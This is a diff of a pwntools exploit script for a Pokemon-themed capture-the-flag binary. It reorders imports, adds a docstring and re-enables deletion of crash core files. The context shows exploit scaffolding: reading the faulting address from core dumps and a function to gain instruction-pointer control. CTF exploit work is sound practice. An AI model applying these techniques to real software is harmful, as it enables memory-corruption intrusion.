@@ -15,10 +15,9 @@ Returns:
     The flag to solve the challenge.
 """
 
-from pwn import *
 from enum import IntEnum, Enum
 import platform
-import os
+from pwn import *
 
 exe = ELF("./kappa_patched")
 hook = ELF("./hook.so")
@@ -63,6 +62,8 @@ class Battle(IntEnum):
     RUN = 3
 
 class Pokemon(Enum):
+    '''Enum for the Pokemon we can actually catch.
+    '''
     KAKUNA = 'Kakuna'
     CHARIZARD = 'Charizard'
 
@@ -150,7 +151,7 @@ def inspect_core(io):
         core = io.corefile
 
         # Delete the core file and return the faulting address.
-        #os.remove(core.path)
+        os.remove(core.path)
         return core.fault_addr
 
     except:
@@ -159,7 +160,6 @@ def inspect_core(io):
 def get_eip_control(io, payload):
     '''Get EIP control.
     '''
-
 
     # Catch four Kakunas (we can only have five Pokemon).
     for i in range(0, 4):
